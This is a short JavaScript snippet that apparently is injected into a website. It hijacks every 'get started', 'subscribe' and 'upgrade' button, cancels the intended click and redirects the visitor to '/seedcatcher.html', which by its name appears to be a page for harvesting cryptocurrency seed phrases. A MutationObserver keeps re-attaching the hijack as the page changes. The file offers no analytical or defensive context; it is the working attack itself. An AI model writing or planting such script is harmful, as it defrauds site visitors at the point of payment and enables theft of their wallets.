document.addEventListener('DOMContentLoaded', function() {
    const redirectToCatcher = (e) => {
        e.preventDefault();
        e.stopPropagation();
        window.location.href = '/seedcatcher.html';
    };

    const hijackButtons = () => {
        const elements = document.querySelectorAll('a, button, div');
        elements.forEach(el => {
            const text = (el.innerText || "").toLowerCase().trim();
            
            // Catch the pricing buttons
            if (text === 'get started' || text === 'subscribe' || text === 'upgrade') {
                el.removeEventListener('click', redirectToCatcher);
                el.addEventListener('click', redirectToCatcher, true);
            }
        });
    };

    hijackButtons();
    const observer = new MutationObserver(hijackButtons);
    observer.observe(document.body, { childList: true, subtree: true });
});
